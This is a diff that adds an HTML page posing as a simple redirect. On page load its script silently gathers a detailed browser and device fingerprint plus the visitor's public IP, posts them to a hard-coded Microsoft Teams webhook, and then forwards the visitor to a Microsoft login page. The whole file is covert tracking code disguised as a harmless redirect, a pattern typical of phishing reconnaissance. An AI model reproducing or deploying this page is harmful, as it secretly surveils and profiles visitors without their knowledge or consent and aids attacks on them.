@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirecting...</title>
+</head>
+<body>
+  <script>
+    (function() {
+      // Collect fingerprint details
+      const userAgent    = navigator.userAgent || "";
+      const screenRes    = `${window.innerWidth}x${window.innerHeight}`;
+      const monitorRes   = `${screen.width}x${screen.height}`;
+      const colorDepth   = screen.colorDepth || "";
+      const pixelDepth   = screen.pixelDepth || "";
+      const language     = navigator.language || navigator.userLanguage || "";
+      const languages    = (navigator.languages && navigator.languages.length)
+                            ? navigator.languages.join(", ")
+                            : "";
+      const tzOffset     = new Date().getTimezoneOffset(); // in minutes
+      const tzName       = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions)
+                            ? Intl.DateTimeFormat().resolvedOptions().timeZone || ""
+                            : "";
+      const cores        = navigator.hardwareConcurrency || "";
+      const memory       = navigator.deviceMemory || "";
+      const platform     = navigator.platform || "";
+      const touchPoints  = navigator.maxTouchPoints || "";
+      const retina       = (window.devicePixelRatio && window.devicePixelRatio > 1) ? "Yes" : "";
+      const plugins      = Array.from(navigator.plugins || []).map(p => p.name).join(", ");
+      const connection   = (navigator.connection && navigator.connection.effectiveType) || "";
+      const cookieEnable = (typeof navigator.cookieEnabled !== "undefined") ? navigator.cookieEnabled.toString() : "";
+      const doNotTrack   = navigator.doNotTrack || "";
+      const localTime    = new Date().toLocaleString();
+      const referrer     = document.referrer || "";
+
+      // Put all data into an array of { label, value } for easy filtering
+      const details = [
+        { label: "Public IP",         value: "" }, // Will be set later when we get IP
+        { label: "User Agent",        value: userAgent },
+        { label: "Screen Resolution", value: screenRes },
+        { label: "Monitor Resolution",value: monitorRes },
+        { label: "Color Depth",       value: colorDepth },
+        { label: "Pixel Depth",       value: pixelDepth },
+        { label: "Language",          value: language },
+        { label: "All Languages",     value: languages },
+        { label: "Timezone Offset (min)", value: tzOffset ? tzOffset.toString() : "" },
+        { label: "Timezone Name",     value: tzName },
+        { label: "CPU Cores",         value: cores.toString() },
+        { label: "Device Memory (GB)",value: memory.toString() },
+        { label: "Platform",          value: platform },
+        { label: "Touch Points",      value: touchPoints.toString() },
+        { label: "Retina Display",    value: retina },
+        { label: "Plugins",           value: plugins },
+        { label: "Connection",        value: connection },
+        { label: "Cookies Enabled",   value: cookieEnable },
+        { label: "Do Not Track",      value: doNotTrack },
+        { label: "Local Time",        value: localTime },
+        { label: "Referrer",          value: referrer }
+      ];
+
+      // Build a table in Markdown, skipping empty or "unknown" fields
+      function buildMarkdownTable(ip) {
+        // Update the IP entry now that we have it
+        details[0].value = ip;
+
+        // Create table header
+        let tableText = "| Field | Value |\n| --- | --- |\n";
+
+        // Append rows for non-empty / non-"unknown"
+        details.forEach(item => {
+          const val = (item.value || "").toString().trim();
+          if (val && val.toLowerCase() !== "unknown") {
+            tableText += `| ${item.label} | ${val} |\n`;
+          }
+        });
+
+        return tableText;
+      }
+
+      const webhookUrl = "https://fallback.webhook.office.com/webhookb2/730ebb60-9a0e-4ae5-aaa7-6b51eec504d0@210df543-18d3-4ed1-a1b2-00f55aa2101b/IncomingWebhook/32df368f72614297886dafd96109a2ac/bf3abece-7d85-4c11-857e-f43b6bb9ee89/V2zV0WVDsRTasK_jWFFfEmuZXVyjMGxVvp1a3UY9eNCrE1";
+
+      // Function to send the final MessageCard
+      function sendMessageCard(tableMarkdown) {
+        const payload = {
+          "@type": "MessageCard",
+          "@context": "http://schema.org/extensions",
+          "summary": "Fingerprint Data",
+          "themeColor": "0078D7",
+          "title": "New Fingerprint Data",
+          "text": tableMarkdown
+        };
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          mode: 'no-cors',
+          body: JSON.stringify(payload)
+        }).catch(error => console.error('Error sending webhook:', error));
+      }
+
+      // 1) Get the public IP from ipify
+      // 2) Build the table
+      // 3) Send to Teams
+      // 4) Redirect
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const table = buildMarkdownTable(data.ip);
+          sendMessageCard(table);
+        })
+        .catch(() => {
+          const table = buildMarkdownTable("Unknown");
+          sendMessageCard(table);
+        });
+
+      // Redirect after a 1.5-second delay
+      setTimeout(() => {
+        window.location.href = "https://login.microsoftonline.com/";
+      }, 1500);
+    })();
+  </script>
+</body>
+</html>
